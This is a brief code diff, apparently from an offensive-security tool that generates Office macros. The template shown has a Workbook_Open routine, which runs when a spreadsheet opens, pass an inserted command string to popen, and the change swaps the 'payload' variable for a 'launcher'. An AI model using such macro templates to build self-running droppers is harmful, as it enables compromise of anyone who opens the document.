@@ -103,6 +103,6 @@ Private Sub Workbook_Open()
     #End If
     result = popen("%s", "r")
 End Sub
-""" %(payload)
+""" %(launcher)
 
             return macro
